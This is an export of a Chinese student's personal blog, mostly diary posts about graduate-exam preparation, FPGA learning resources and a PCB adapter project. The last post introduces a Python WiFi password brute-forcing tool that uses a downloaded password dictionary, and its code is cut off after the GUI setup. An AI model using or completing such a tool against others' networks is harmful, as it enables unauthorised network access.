[{"title":"25天考试倒计时","path":"/2024/11/26/周记/25天考试倒计时/","content":"情况不太理想考研最后倒计时25天，不知不觉从坐在教室就出汗的9月份，一眨眼，到了一出门就要裹紧羽绒服的11月，甚至已经将要下雪了，ipad上每日计划写了快30页了，复习资料做了一本又一本，试卷做了一遍又一遍，草稿纸都接近7cm了。这段时间，我感觉我出现了很多很多心理问题，一天中出现很多种情绪，从开心-烦躁-平淡-烦躁-再到开心-…，这种多巴胺紊乱的情况，另我一点一点毁掉自己的灵魂，我感觉已经不能说是一个正常的人，相反，却是一具冰冷麻木的躯体！ 我很抗拒，内心的灵魂似乎触发了自我保护的程序，做题时，脑子会自动关机，之前学过的知识点，做过很多次的题目，现在一遍一遍的错，准确的说不是我不会，而是似乎我控制不了我的灵魂。 今天放假今天是给自己放假的一天，死了这么多天，或许现在才是本该是我的那个我在写这些话。既然现在意识到这个致命的问题所在，那么今晚，我要想办法应对这个问题 辩证的角度分析问题让我们对现在存在的几位敌人进行剖析，分析出来谁是我的敌人，谁是我的朋友，并且要团结一切可以团结的力量，统一战线，打赢最后的这一场解放战争！ 究其原因，首先，这段时间没有精气神为主要矛盾的主要方面，刨根问底，为什么没有精气神，怎么造成的。从生理的角度来讲，从8月份的战线持续到现在，身体没有得到有效的放松休息占比约60%，有时候坐在教室开始焦虑的时候大部分都是在腰酸背痛肚子涨的情况下开始的。这时候我脑子里非常想出去跑跑步，举举哑铃之类的锻炼。另外40%应该是心理上的问题，我认为我是一个难得的情绪非常敏感的人，一件小事的发生，或许已经可以在自己的脑子里翻江倒海了，情绪波动太大 其次，关于次要矛盾的主要方面，毋庸置疑就是注意力分散，在进行解题的时候，总是会被其他的事情所分散注意力，例如最明显的是手机，其次就是不自觉的查看周围同学的状态，在注意力经常被打断的情况下，很难保证高效率高质量的完成规划的任务，并且也比较容易造成心理焦虑的情绪 最后，在讨论次要矛盾的次要方面，占比较小，就不在这里进行分析了。想要解决这些问题，在关于主要矛盾的主要方面，保证身体的健康，晚上可以做一些小运动舒展身体筋络，可以从b战中找一些操，跟着简单锻炼，其次，在晚饭后应抽出时间去操场散步，呼吸呼吸新鲜空气，舒展心情，缓解焦虑情绪 解决主要问题在关于主要矛盾的次要方面时，我认为，情绪波动引起的原因，其中70%的原因是因为社交活动引起的，另外是试卷难易引起的。那这件问题的源头，可以从次要矛盾的主要方面进行解决。 在关于次要矛盾的主要方面，为了能够在学习时有较高的注意力集中，我的应对方法是将手机放到宿舍，早上出门之后到晚上回宿舍前不要将手机放在身边（从根源入手），戒断一切无效社交活动，从杂乱的快节奏短视频中脱离，接受的信息少了，自然胡思乱想的事情就少了。 备注其实这篇内容是分两次写完的，11.24号是出去休息了一天，在早上11点多入住了酒店就呆在里面看电视，刷视频，洗了洗衣服，浑浑噩噩的到了11点钟，实在是无法忍受继续让自己这样颓废下去，必须做出改变，所以在26号凌晨写了前三点，最后写的时候，写一个字睡着了三次！最后无奈放到第二天早上写了解决问题并下定决心。现在是26号下午14点，刚从酒店到宿舍","tags":["周记"],"categories":["周记"]},{"title":"w6把F当成T看","path":"/2024/10/14/周记/w6把F当成T看/","content":"日常生活 2024 年 10 月 14日今天应该是倒计时69天了，但是多目前为止，题目做的还是一坨屎一样臭，错的比对的多—。—, 关于数学，做了一套真题试卷，150分的卷子多算能考50分，大题基本上不怎么得分或者说没有完整的完成一道大题。通过总结之前做的提高题还有这一套真题试卷，我发现，丢分的原因并不是因为我做错了或者说遗漏了题目中的某一个条件，一部分，看上去似曾相识但拼命也想不起来那一条公式是什么，比如隐函数求导，公式记住了一些，但是刚好！题目要求的这条公式却没有记住，并且很确信之前做过这类题目，再或者说，概念题目，那道题在之前见过超过两遍，但是到现在还是做不对它！这是一部分原因另一部分丢分的题目总结下来大概是从开始复习就害怕，不想做的一类题目现在的应对办法我总结如下：公式记忆不牢固就一天看一遍，将做题过程中遇到的题目所需要记忆的内容记录在一个小本本上，每天看一遍，我就不信还记不住回炉重造，碰到不熟悉的知识点，掏出《辅导讲义》，完完整整的将一章节的内容重新复习一遍，当然并不能机械的看知识点，侧重点在于讲义中的例题，哪些例题都是自己实打实做过的题目，看完知识点后，重点再将例题重新做一遍，审查每一个选项正确和错误的原因，有必要的需要记录在自己的小本本上。不需要去纠结自己错了多少，把F当成T看，心里默念：妖怪！哪里跑，看你爷爷这就将你收了！！记不住的公式，尝试寻找底层思路，尝试自己进行推导一遍 头脑风暴 今天遇到一件挺遗憾的事情，在上学期结束前，我准备送给一位朋友一块打印出来的电路板，感觉还是蛮好看的一块梵高的星空画，但那段时间挺忙的就想着在微信上跟她说一下有时间可以来我的实验室拿一下。emm，直到今天发现她把我删掉了，然后我很不理解为什么突然这样做，以为是误触或者其他原因，最后加上她的微信后才告诉我她认为我这样是不尊重她，认为真的想要送给别人礼物的话应该亲自去送而不是让对方跑一趟来拿。对此我不否定我的错误但也不承认我的错误（跟马克思学的：对立统一但缺一不可原则哈哈哈），最后我表示很抱歉对你的生活产生了一些困扰，也互相以希望将来对方的生活愉快的话语结束了这段友谊。 关于短视频的一些想法：刷抖音的时候，一个短视频的内容如下：采访李阳说，当代一千万大学生全是废物！既没有强健的体魄，又没有良好的习惯，也没有伟大的志向、伟大的梦想，1000万残缺不全。刚听到的时候，我竟然没有很大的心理波动，很自然的就滑向下一个视频，像一个没有味觉的猪一样疯狂的想要从垃圾堆中妄想汲取一样，让自己长更多的肉。 就在刷着下面的几个视频的时候，突然回过神来回想着：当代一千万大学生全是… 突内心一颤，思维就像触电一样，从暖暖的尸体中活了过来。心里默默的思索着：这太可怕了，活成人机了！！ 他说的没错，骂的也没有错，事实就是如此，现在经济下行，各行各业都在慢慢沉睡下去，大学生看不到未来的希望，找不到努力的意义，当然就跟从了内心，服从了世界发展的规律（熵增定理）。我不想也活成这个样子，我想做些不一样的东西，想去实现自己的人生价值，相信没有一个人甘心去当一个废物，要动起来，做些很酷的事情。","tags":["周记"],"categories":["周记"]},{"title":"w5感觉良好，步入正轨了","path":"/2024/09/01/周记/w5感觉良好，步入正轨了/","content":"日常生活 2024 年 9 月 2日距离考研还有110天左右，从6月10号复习到现在也快三个月了，目前的复习进度是高数强化还剩两章内容、专业课第一轮到第五章拉普拉斯变换，政治和英语复习的较少一些，主要投入在了两门大头上虽然进度相对主流比较慢了很多，但是俗话说“块就是慢，慢就是快”，踏踏实实的真正的学到脑子里的东西才算是自己的。（到底复习的如何还得下个月开始真题阶段才能体现出来哈）。说归说，但我现在感觉到焦虑的事情是为什么别人都很焦虑我却对考研进度没有焦虑，请问这正不正常哈哈！2024 年 9 月 4日·今天尝试做了一下英语阅读题，听了斌斌老师的做题课，感觉废话有点多，一节课两小时光听他讲废话了，给我的感觉不太靠谱的样子。果断放弃他的课程计划。做了一下题目，我觉得归根到底，还是单词基础的问题，目前计划在做题的过程中背单词，因为之前那种背单词的方法感觉效率也不是很高开始有一点进度焦虑了 !_，相对加快一些学习进度吧，然后就是不要看到复杂的计算题就跳过，要直面困难！明天重新把第四章微分方程的660和例题做一遍，这一章做题做的有些吃力，回头重来一边，然后9月份重点还是在高数和专业课2024 年 9 月 7日每次学习感到很累的时候会想到再过几天就是周六可以休息了，这不，心心念念的周六水灵灵的就到了哈哈，晚上特意没有定闹钟直接睡到10点半自然醒，哇，当时睁开眼的时候真是满足！再周内的时候，想着周六要约朋友打会篮球出出汗，还想踢踢足球，打打台球，最后出去吃一顿火锅鸡。然后真的到周六的时候，反而没有想运动甚至出门的想法了，中午自己出去吃了一顿螺蛳粉，这个过程中我竟然感觉到怕人，怕见人。不知道这是什么心理，点餐的时候竟然有这么几个字是发抖的~可能是平时太压抑了吧2024 年 9 月 8日· 头脑风暴 今天遇到一件挺遗憾的事情，在上学期结束前，我准备送给一位朋友一块打印出来的电路板，感觉还是蛮好看的一块梵高的星空画，但那段时间挺忙的就想着在微信上跟她说一下有时间可以来我的实验室拿一下。emm，直到今天发现她把我删掉了，然后我很不理解为什么突然这样做，以为是误触或者其他原因，最后加上她的微信后才告诉我她认为我这样是不尊重她，认为真的想要送给别人礼物的话应该亲自去送而不是让对方跑一趟来拿。对此我不否定我的错误但也不承认我的错误（跟马克思学的：对立统一但缺一不可原则哈哈哈），最后我表示很抱歉对你的生活产生了一些困扰，也互相以希望将来对方的生活愉快的话语结束了这段友谊。 关于短视频的一些想法：刷抖音的时候，一个短视频的内容如下：采访李阳说，当代一千万大学生全是废物！既没有强健的体魄，又没有良好的习惯，也没有伟大的志向、伟大的梦想，1000万残缺不全。刚听到的时候，我竟然没有很大的心理波动，很自然的就滑向下一个视频，像一个没有味觉的猪一样疯狂的想要从垃圾堆中妄想汲取一样，让自己长更多的肉。 就在刷着下面的几个视频的时候，突然回过神来回想着：当代一千万大学生全是… 突内心一颤，思维就像触电一样，从暖暖的尸体中活了过来。心里默默的思索着：这太可怕了，活成人机了！！ 他说的没错，骂的也没有错，事实就是如此，现在经济下行，各行各业都在慢慢沉睡下去，大学生看不到未来的希望，找不到努力的意义，当然就跟从了内心，服从了世界发展的规律（熵增定理）。我不想也活成这个样子，我想做些不一样的东西，想去实现自己的人生价值，相信没有一个人甘心去当一个废物，要动起来，做些很酷的事情。","tags":["周记"],"categories":["周记"]},{"title":"2024.8.21，我想，这可能是努力的意义吧","path":"/2024/09/01/2024.8.21，我想，这可能是努力的意义吧/","content":"2024.8.21，我想，这可能是努力的意义吧这天，早上6点起床，7点半到图书馆开始复习考研，中午11点去食堂，下午是1点回到图书馆复习直到下午4点再次去食堂，回到宿舍后想着再玩一会，反正已经复习了6个多小时了，今天给自己的制定的计划也完成差不多了。然后开始刷起了抖音，直到刷到一个张雪峰的一个演讲片段… … 他讲到他父亲得癌症的一个故事，很现实的一个故事，反复看了两遍，感觉好像从迷茫、无知、自以为是的迷雾中向前迈进了一步。事情是这样的 张雪峰说那是他父亲得了骨癌，这是一个让人疼不欲生的癌症，一场手术花了12万，一套钢钉1万多，前前后后我认为六七十万是少不了的，而且治不好，张雪峰有钱啊，在医院住单人病房（一天多交600多，一个月就多交2万多），他父亲后面疼的受不了了，什么止疼药、止疼泵，医生说用什么就上什么。最后医生告诉他说建议拉回家，治不好的，再治就是往里面砸钱。张雪峰不同意，他知道最有劲的止疼药就是dp，这个药根本出不了医院的，回家他父亲就会被活活疼死。但是如果不出医，每天光维持他父亲生命的仪器还有病房就很多钱了，最后他父亲还是走了，但没有受多大的罪就是福报。恐怕多少普通家庭的人面对这个事情的时候早就支撑不住了，那怎么办，面对的只能是让最亲近的人在家里活活疼死。 在现在这个时代，癌症太常见了而非个例，说不定哪一天你就需要面对这个场面，到时候你怎么办，你能说我没钱，咱们回家吧，你儿子没出息。我是说不出口，怎么办，你得努力啊，大多数人都会选择放弃而你不想选择这个，所以你得闯出点名堂！！","tags":["周记"],"categories":["周记"]},{"title":"雨后的天，特别晴","path":"/2024/08/31/雨后的天，特别晴/","content":"每次在天津下完雨之后，天气就特晴，天也特别蓝。微风轻抚，吹的芦苇丛发出撒撒的声音。阳光洒在体肤上，温温的，暖暖的，甚是喜欢啊 空气也很清新，坐在湖边的石凳上，看着水里的几条傻鱼游来游去哈哈。","tags":["blog"],"categories":["blog"]},{"title":"资料包","path":"/2024/08/31/资料包/","content":"资料包汇总1. Altium Designer整合了海量学习资源（包括直播课件、案例和软件各版本安装包），点击前往： Altium Designer 多层高速PCB 课程回放： Altium Designer 23入门实战课程-STM32四层板PCB设计_哔哩哔哩_bilibili 2. FPGA视频教程01_数字电路基础知识-锆石科技_哔哩哔哩_bilibili 26_数字示波器的项目工程讲解_哔哩哔哩_bilibili Verilog语法练习：HDLBits (01xz.net) DDR3基础知识_哔哩哔哩_bilibili 公众号：硅农-图像处理 (qq.com) [公众号：硅农-Verilog奇技淫巧 (qq.com) 公众号：硅农-提取码：J8qq： 至芯FPGA培训教程_哔哩哔哩_bilibili FPGA摄像头视频采集系统设计_哔哩哔哩_bilibili 3. FPGA笔记书籍Verilog开发经验+FPGA自学笔记-设计与验证 4. FPGA面试题笔面试题 (qq.com) 5. FPGA学习网站 fpga4fun.com - FPGA 的乐趣所在 这个网站提供了大量的FPGA实际项目的讲解文章，且都附带了完整的工程文件供免费下载。 FPGA应用相关的资源网站 (eetree.cn) 这个网站根据不同的分类整理了许多的FPGA资源和网站，是个不错的导航型网站。 欢迎来到 OpenHW 平台-主页 一个Xilinx相关内容开源网站，有很多有意思不错的项目。 公众号：PYNQ开源社区 属于Xilinx下的公众号，讲解PYNQ，包含开源项目案例、大学计划， Sunburst) FPGA大佬Cliff Cummings和他的Sunburst公司，Cliff Cummings本身就是Verilog标准的制定者之一，写了很多非常好的关于FPGA的文章，在这个网站可以下到免费的电子版。 Gisselquist Technology 开发的 ZipCPU 一个国外的FPGA大佬的技术博客，一直在更新，主要是软核CPU和FPGA设计技巧相关内容。 openFPGA666&#x2F;FpgaGuide: 分享FPGA开发知识、优秀文章、学习网站以及开源项目。本项目收集了github中许多FPGA开源项目。 Project F FPGA大神Will Green的个人博客网站，分享了大量关于FPGA的内容，从原理到代码实现，并在Github上开源。抽空可以看看 首页 |DFC设计 (dfcdesign.cz) 提供FPGA开源硬件和开源项目。硬件fpga模块很牛掰，并且开源，可以复现！！ 10 . Cliff Cummings的Verilog学习资料及其他学习项目-CSDN博客 芯路恒资料与技术支持专区 - 芯路恒电子技术论坛 - Powered by Discuz! (corecourse.cn) 小梅哥FPGA论坛，资料很丰富，包含很多小工具和项目 小工具：赫兹Hz,秒s等常见频率,周期单位转换在线计算器 (23bei.com) 6. FPGA学习路线 7. 一些问题 做fpga为什么要卡硕士学历? 想搞FPGA,最好把数字信号处理，随机信号处理（基础是概率统计与随机过程）的课程学好，无论以后是做图像处理还是通信物理层，或者是雷达信号处理都需要这些理论基础。数字信号处理最少需要掌握FFT,数字滤波器FR,R的设计步骤，以及自适应滤波器的设计方法（需要概率统计的知识）。通信原理最好把数字频带传输的调制解调原理，数字同步技术的原理搞清楚，因为只要稍微高端一点的FPGA应用都要求会这些东西。很多人买个开发板，发现例程都把FPGA当单片机用，让你觉得FPGA也不过如此。实际没有几家公司会用FPGA来干这些单片机都能干的活。除了高速接口外，主流的应用领域几乎都需要懂数字信号处理的算法。越现代的算法，对统计学的要求越高。推荐看下杜勇老师的几本书(数字滤波器，调制解调，数字同步，锁相环共四本书)和张颢老师的现代信号处理的课程，特别是张颢老师的现代信号处理，极其精彩与深刻，几乎把人类在2012年之前在信号处理这个领域的所有研究成果都讲到了，对于做无线通信，雷达，导航，声呐等领域可能遇到的信号处理问题按照时间线进行非常系统的梳理和深刻的讲解，真的是让人高山仰止！真的感谢互联网时代大家无私的分享！如果看不懂，就去补你的数学基础，主要是傅立叶分析和随机过程的这两块。虽然现在有matlab这样强大的工具，不会数学推导也能实现你想要的功能，但是学懂了，用起工具来更得心应手。你以为你买个板子，把例程跑一遍，会写点接口就入门了，实际你连皮毛都没有摸到。在真正需要大量使用FPGA或DSP,并且把它们当核心处理平台而不是当配角的领域，对于数学和信号处理要求还是很高的。","tags":["资料"],"categories":["资料"]},{"title":"wk2周记：最终的决定","path":"/2024/08/31/周记/w2周记：最终的决定/","content":"到底考研还是工作！！！！ 日常生活 名称 打卡 ① 单词，语句 打卡 ***** 次 ② 运动健身 打卡 1次 ③ FPGA ④ * 打卡 ***** 次 ⑤ * ***** 2024 年 6 月 17 日·（16号补充）昨天实在是太累了，昨天考完四级，然后去了健身房练了半个小时去游泳了半个小时左右。游泳池里的人实在是太多了，呆不下去了就跑了。下午回来帮老师整理了一下档案，晚点一起去吃了晚饭。回到宿舍12点左右睡的觉，第二天直接睡到11点，（好家伙直接昏迷了11个小时）​\t不知道是因为什么，反正那一天很累，除了抖音这种不用带脑子的，别的啥也看不进去。心情跌落到最低点，很想去放浪一次，然后晚上就去外面打了1小时的台球到半夜12点（自己练球），完事去网吧包宿，不得不说对于没有怎么熬过夜的人来说，包宿真的是熬不动。打了2局游戏后直接退出去blbl上刷视频去了。​\t最后，整理了一下UP主去参加展和请同学们介绍比赛的项目做了一些笔记如果，我真的把这些项目全部做出来，我到底要多NB哈哈哈2024 年 6 月 18 日·2024 年 6 月 19 日·2024 年 6 月 20 日·消失了两天，这两天，不对，是这段时间我都一直失眠，睡觉没有之前那种到头就睡，3分钟入梦的情况了。其实说白了就是心里放了事情，考研与工作之间的抉择，这是一件很大的事情，足够影响我未来几十年的道路口了，所以我必须很谨慎的选择，权衡利弊计划未来的退路。那么也就是这一个周记的标题《最终的决定》，我必须在这一周中作出最终的抉择，其实经过这段时间后，最终也确定了要去考！相信这是最好的选择。昨天晚上同样也是很晚也睡不着，气的我半夜直接打开高数电子书，(睡不着？睡不着就别睡了！！)，然后从第一章第一节的内容开始复习，慢慢的大概5分钟过去了眼镜就睁不开了，心想着那哪行，必须把第一章复习完，不能让我这么轻松就睡着了。我就使劲熬，大概又过了不知道多久，再次有意识的时候发现已经闭上眼不知道多久了，最后就把手机关了好好睡觉去了。整个过程我猜在10分钟左右就顺利入梦了哈哈哈！！2024 年 6 月 21 日·2024 年 6 月 22 日·今天有一件比较重要的事情发生，我一直都想写下来，但是每一次动笔都被迫放下来了，因为我觉得这涉及到自己的隐私，这些东西我确实是想记录下来但是我不想分享给任何人看。所以我决定除了一些严重涉及到自己隐私的事情外，将内容记录在大家可以看到的这个周记系列上，另一部分，我决定还是使用原来的Notion笔记进行记录。最后也推荐大家可以试试这个软件，可玩性很强，页面也比较美丽哈哈今天晚上去游泳回来的路上，吃了每次路过都心心念念的路边烧烤摊，整一瓶啤酒，撸着串，刷着电视剧解说，吹着风看着晚霞。突然感觉我的生活很不错嘛。回学校的路上吹着风（温风中加掺着凉意）2024 年 6 月 23 日· 周总结和反思 不要总觉得自己被轻视，先问问自己有多少分量。—— 白羽&#x2F;高手控局：中国历史中的殿堂级处事智慧","tags":["周记"],"categories":["周记"]},{"title":"w4周记：毛泽东选集","path":"/2024/08/31/周记/w4周记：毛泽东选集/","content":"日常生活 名称 打卡 ① 单词，语句 打卡 ***** 次 ② 运动健身 打卡 ***** 次 ③ FPGA ④ * 打卡 ***** 次 ⑤ * ***** 2024 年 7 月 8日2024 年 7 月 9日 · 2024 年 7 月 10日 · 2024 年 7 月 11日 现在的社会，到底是进步还是在走下埔路 --- 去餐馆吃顿饭需要付6块钱的餐具费 去理发店理发，还需要多付1块钱的毛巾费 去小卖部买瓶矿泉水，1快的水都很少见了 ··· ··· 社会充满了焦虑，工作的人整天卷着加班，就是为了不被这个自己并不喜欢的工作裁掉，学生拼命的考研、考公，为了不被学历贬值的风波波及到自己。企业在想着如何降本增效，教授们想着下一篇SCI怎么“编”，小商贩们用着8毛钱一块的牛排跟顾客做着买卖，股民们整天对A股提心掉胆的。 人人都在用自己的健康来换生活，像我也被迫成为当中的一员，今天6点就爬起来，做了一会运动（这是一整天为数不多自己的时间）就开始跑出门，早上在实验室待了一小时，为自己的项目修改BUG。接着去了图书馆，再接着去吃饭午睡半小时，再到图书馆复习考研，再座椅上坐的屁股都湿了，还想着待会去实验室，走着过去，顺便凉凉自己的“湿屁股”和换换脑子····关于这个周记，我觉得我很努力的去写了，但是，很遗憾的是，每天的生活都是这么枯燥，根本没什么新鲜的故事了。如果硬要写，可能就是流水线式的生活吧 起床……6:00 哑铃锻炼和腹部锻炼……6:15-6:45 出门晨跑/散步……6:50-7:30 洗澡……8:00 早餐和单词背诵/口语练习/美剧 /……-8:30 工作……8:30-17:30 晚饭和背单词……18:00-18:40 练习演讲和社交礼仪……19:00-19:40 研究有趣的新事物……20:00-21:00 ········ 2024 年 7 月 12日 · 2024 年 7 月 13日 · 2024 年 7 月 14日 · 周总结和反思","tags":["周记"],"categories":["周记"]},{"title":"wk1周记：新的开始，希望起个好头","path":"/2024/08/31/周记/w1周记：新的开始，希望起个好头/","content":"日常生活 名称 打卡 ① 单词，语句 打卡 ***** 次 ② 运动健身 1,3,4,5,6,7 ③ FPGA ④ * 打卡 ***** 次 ⑤ * ***** 2024 年 6 月 10 日今天的事情很多，首先是端午节（好像也没有怎么过节）然后是考研复习的第一天，学了点四级写作、考研高数的基础部分，学了点FPGA的内容，但是碰到了很多问题https://zikwq.github.io/2024/06/10/为什么FPGA的阻塞赋值会延时一个时钟周期，而在某些情况下不延时一个时钟周期呐？/https://zikwq.github.io/2024/06/10/为什么FPGA的阻塞赋值会延时一个时钟周期，而在某些情况下不延时一个时钟周期呐？/开设周专栏，主要记录一下每周发生的事情和督促自己的考研复习。2024 年 6 月 11 日​\t一个大创结项，学院签字签了一上午,。故事是这样的：早上刘老师在指导老师的栏签完字，之间让我找杨老师，咱也不懂，我就屁颠屁颠的找了杨老师（不知道他的办公室在哪里，还在了好一会），杨老师说得先找学院签字，然后找刘老师问学院签字找哪位老师，他说找刘老师，然后我就直接去找了刘老师（不清楚刘老师的办公室在哪里，又找了好一会），完了盖了个章又回去找杨老师，杨老师说还得签字~，我又找到刘老师说需要签字，他说这不归他管，让我找张院长试试。​\t找就找呗，反正都到这了，张院长去上课了，让我等会。然后就回到实验室等等等，等到下课的点又跑到办公室找张院长，等了半个小时，但是她不在应该是吃饭去了。​\t下午刘老师说听张老师（另一位老师）说张院长来了，让我过去找他签字，然后我又屁颠屁颠的跑到行政楼上了四楼找到张院长，此时的张院长在沙发上睡觉，然后不好意思的叫醒聊正事，完了，又弄错了，张院长说她不管这事，让我吉老师~~~~​ （让我翻翻表情包有没有能够表达我当时心情的表情！），但是吉老师也没在办公室。完犊子了，现在都快4点了，待会就下班了，今天签个字都签不完！！！！​\t最后，联系了一起坐大创的另一位小伙伴，他说找季老师签字，我这次反复确认是不是，确定吗。（ 因为他签的字有点分辨不出来，名字从季常，到季*）。然后去签了字到杨老师那边交上去了。​\t终结。早上9点多买了杯咖啡，12点多才喝了一半~2024 年 6 月 12 日​\t游泳，联系了蝶泳打腿，感觉最后有一次打得很有感觉，其他的不尽人意了。还联系了蹬壁转身，联系的时候还挺好，实战的时候，“脑袋进水“直接懵了。复习了自由泳。接近6点的时候到的健身房，主要锻炼了上肢力量和做了20个仰卧起坐加上1分钟的平板撑。一共运动了接近2.5h。达标！​\t四级的作文模版又复习了一遍，完形填空和段落匹配的做题技巧。还有两天考试~2024 年 6 月 13 日昨天晚上给自己做的一个计划。“起床、游泳、训练、12点开始复习四级”，然而今天做到顺序是“10点起床、简单复习了四级、游泳、训练”。复习时间实际上减少了很多，锻炼时间不可思议的达到了3h40m，导致现在精疲力尽（打着哈哈流着泪）。15 号就考四级了，现在拖着疲惫的身体来到实验室，大概率要放松（发呆）到今天结束了。新想法：要不要后面的内容尽可能使用英文来表达，提高自己的英语水平呐？2024 年 6 月 14 日考研的心又一次崩塌了，复习了这两天数学基础，发现我完全学习不下去，应该是很久没有这样学习过了，很不适应，想想还有英语政治专业课要使劲背书。我就直到我大概率是坚持不下去的。即便坚持到了最后，就像刘老师说的上岸一个二本，你要不要去上。老师的水平还没有你高，一个差一点的桂林电子都要310分才行上岸。昨天想了一晚上，（睡前想，晚上惊醒了几次，醒了又想）。上岸一个二本学校，还不如去工作3年2024 年 6 月 15 日·2024 年 6 月 16 日今天四级考完了，自己感觉有65%的可能性可以通过。虽然我知道这一次的四级很重要，但还是沉不下心来去好好复习，大概率是因为太久时间没有好好学习了，突然看书觉得不适应吧 周总结和反思 为了做一件事情，而且准备无数件事情，这是不可取的做法。干就完了，反正死不了。冲冲冲~~！ 在这个信息爆炸的知识付费时代，请教问题、获取知识，得到答案，绝对不会是一个免费的过程。 “我忍住没有找你的日子里，你是不是也很庆幸我没有再烦你”","tags":["周记"],"categories":["周记"]},{"title":"wk3周记：睡个好觉","path":"/2024/08/31/周记/w3周记：睡个好觉/","content":"日常生活 名称 打卡 ① 单词，语句 打卡 ***** 次 ② 运动健身 打卡 ***** 次 ③ FPGA ④ * 打卡 ***** 次 ⑤ * ***** 2024 年 6 月 24 日不知不觉都开启了第三周的周记了，这个标题《睡个好觉》的来源是，最近失眠我找到了一个很好的解决办法，既不痛苦也不焦虑缺很爽了办法—当你夜里感到辗转反侧的时候，不用强迫自己，你可以拿起手机，打开单词书，先去背上20个单词助兴，接着打开高数的电子书，预习明天需要学习的章节内容，相信我，我保证你在看完一章前，不知不觉的就闭上眼了。如果你对高数非常着迷的话，或许可以换一本英语阅读亦或者是专业书来代替它哈哈。（课堂上的觉，睡得总是很舒服）2024 年 6 月 25 日·今日任务： 完成微分中值定理的复习任务 背单词40 vivado使用hdmi时序设计&#x2F;完成一半2024 年 6 月 26 日 完成不定积分&#x2F;定积分的复习任务 完成hdmi显示，完成VGA字符游走程序从VGA迁移到hdmi一个hdmi显示的程序，弄了两天都没弄好，26号弄了半天，程序部分弄完了，到最后一部分对管脚进行约束的时候出岔子。争取27号能顺利结束这个事情2024 年 6 月 27 日 完成定积分的应用和微分方程的复习内容Good job，问题找到了，时钟引脚定义错了，C8引脚携程C9引脚了，HDMI已经成功显示出来了，下一步就是MIG IP核的配置了。找时间把HDMI的内容整理出来。但是这两天有点忙，明天要去驾校练车，大概1个小时就能结束了，我在考虑要不要把我的电脑带过去，在这段时间里面写HDMI的教程或者学习高数的今天的任务完成了一半，看不下去了，想赶紧去超市买一块西瓜吃哈哈。只简单看完了定积分的应用。剩下的明天在弄吧感觉好几天没去健身房了2024 年 6 月 28 日 微分方程-的复习内容 hdmi文档、IIC的OLED屏幕显示文档的编写 上午驾校练车2024 年 6 月 29 日 mig ip核的配置，跑通摄像头例程 二重积分和三重积分的复习内容2024 年 6 月 30 日· 周总结和反思 既然在国内，既然大多数人都比国外卷这么多了，为什么社会还是无法慢慢变好，为什么还是一直走下坡路？为什么国外人相对来说这么放松，但是生活却还这么好。 我们一直在考试，应试思维严重，我慢慢觉得，大学中大二大三才是我十几年中真正学习的时间。之前的时间都被浪费在毫无意义的应试教育上，拼命背课本、拼命做题，这有什么意义呐，虽然很努力，学习的知识可以来说会比国外其他同龄人在课本上的表现更加优秀，但这并不能促使我们成为某一领域中的专家。我们只不过是在拼命的摄取不需要的养分，在学习FPGA的过程中，我有很深刻的体会就是我感觉我花费十几年时间来学习的那些东西丝毫不能（用处不大）让我学习FPGA更加顺利（甚至会出现思 维不活跃，产生学习的反感，一些正在入门的同学可能直接会退缩回去，再也提不起什么学习的兴致）。我们的教育-在大学之前非常严格，大学之后突然放松。很多人因为这个巨大的落差找不到未来的方向了。 很幸运的是我有一个记录生活的习惯，虽然这个博客才开通50多天，但在之前会记录在Notion或者日记本上，让我保持清醒、理智的状态，偶尔会记录生活的感悟、自己的认知见解，很庆幸的是因为这个习惯，我才能侥幸残存一些“理智”，找到自己的方向，跳出这个怪圈。","tags":["周记"],"categories":["周记"]},{"title":"画了一块非常丑陋的PCB","path":"/2024/08/31/画了一块非常丑陋的PCB/","content":"1. 给米联客FPGA的FEP接口画了一个转接板在淘宝上购买的一块米联客的FPGA开发板，但是它的底板使用了自定义的FEP接口，网上的资料少之又少。在这块开发板上不能像至芯的那块开发板一样去开发IO，对于本来就是小白的我来说，这个接口，甚至这个接口元件见都没见过，何谈开发，我还是习惯使用排针哈哈。然后我就去询问客服： 然后淘宝上： 好好好，独家！！ 不久是一个转接卡嘛，对应着在PCB中连连看不就行了吗，干嘛卖这么贵， 2. PCB制作的过程弄明白接口元件首先去弄明白这到底是一个什么东西，去网上搜FEP，研究者看看有没有案例资料可以参考一下，–&gt; 很干净，搜到的几篇文章，除了网站不是一个之外，内容是一字不变！ 然后去立创商城看看有没有好心人画好了开源出来 –&gt; Nothing 接着去Github上，找找有没有用这个开发板来驱动什么东西的，例如驱动一个步进电机，甚至接个LED让它亮起来都行 —&gt; 冷门！非常冷门，除了米联客官方弄的几个例程之外，再无其他 不得不批评一下啊，你家的生态呐~~~ 最后，自己靠不住、社区靠不住，还得靠淘宝客服！集各种专业人才于一体、免费答疑的良心软件。客服还将结构图发给我让我对比着看哈哈 拍照 -&gt; 淘宝识图 -&gt; 这个接口叫做BTB -&gt; 联系卖家，数针脚数， -&gt; 确定我需要60PinBTB公头 -&gt; 还要确定间距？ -&gt; 扒米联客给我的100多个G的资料找答案 -&gt; 确定需要0.8mm间距的60PinBTB公头 绘制原理图针对我这个小白来说，绘制原理图最快捷也是最笨的方法就如下图所示 直接摆上去两个接口和两个要转换的接口，一股脑对应接上去，简单易懂（但不省时，但也最省时） 原来打算用刚学的AD来绘制这个原理图的，顺便练习一下，但奈何AD实在是太专业，导进去的原理图库，转PCB的时候不成功。弄不明白，最后还是选择国产EDA之光–立创EDA PCB连连看原理图画好了，就只剩下PCB了，说难也不难，说不难就是线太多了，得先合理布局 在PCB的时候，还需要注意米联客开发板上两个母头之间的间距，我当时是在AD里面导入了米联客给的FEPPCB库文件，从里面量出来的距离，然后在立创里面手动调整间距的。（第一版在打印了，花了我31块大洋，希望不会出现差错！） 这里就是绘制好的PCB了，花了我一天半的时间 总结用最近新学的一句话：踏踏实实的走，步子迈得大，容易扯到蛋","tags":["blog"],"categories":["blog"]},{"title":"WIFI暴力破解-Python","path":"/2024/08/31/WIFI暴力破解-Python/","content":"使用方法运行程序后，需要去找一个密码字典带导入。密码字典的质量越高，破解越快。可以去github上找一个高质量的字典 程序wifi.py from tkinter import * from tkinter import ttk import pywifi from pywifi import const import time import tkinter.filedialog # 在Gui中打开文件浏览 import tkinter.messagebox # 打开tkiner的消息提醒框 class MY_GUI(): def __init__(self, init_window_name): self.init_window_name = init_window_name # 密码文件路径 self.get_value = StringVar() # 设置可变内容 # 获取破解wifi账号 self.get_wifi_value = StringVar() # 获取wifi密码 self.get_wifimm_value = StringVar() # 抓取网卡接口 self.wifi = pywifi.PyWiFi() # 抓取第一个无线网卡 self.iface = self.wifi.interfaces()[0] # 测试链接断开所有链接 self.iface.disconnect() time.sleep(1) # 